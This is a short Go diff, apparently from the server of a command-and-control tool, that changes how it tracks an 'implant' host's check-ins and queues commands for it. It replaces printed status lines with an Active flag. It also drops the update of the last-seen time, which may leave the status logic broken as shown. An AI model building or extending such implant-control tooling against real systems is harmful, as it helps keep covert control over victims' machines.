@@ -2,7 +2,6 @@ package main
 
 import (
 	"bufio"
-	"fmt"
 	"log"
 	"net"
 	"strings"
@@ -11,7 +10,7 @@ import (
 
 type implantID struct {
 	Hostname string
-	LastSeen int
+	Active   bool
 }
 
 var implant implantID
@@ -37,14 +36,14 @@ func initalizeServer() {
 	}
 }
 
-func checkImplantStatus() string {
+func checkImplantStatus() {
 
 	for {
 		time.Sleep(10 * time.Second)
 		if time.Since(lastSeen) > 30*time.Second {
-			fmt.Println("\n[!] Implant hasn't checked in")
+			implant.Active = false
 		} else {
-			fmt.Println("\n[+] Implant active, last seen:", lastSeen)
+			implant.Active = true
 		}
 	}
 }
@@ -62,9 +61,9 @@ func handleImplants(conn net.Conn) {
 	defer conn.Close()
 	reader := bufio.NewReader(conn)
 	hostname := GetHostname(reader)
-	lastSeen = time.Now()
 	implant = implantID{
 		Hostname: hostname,
+		Active:   true,
 	}
 
 	if pendingCommand != "" {
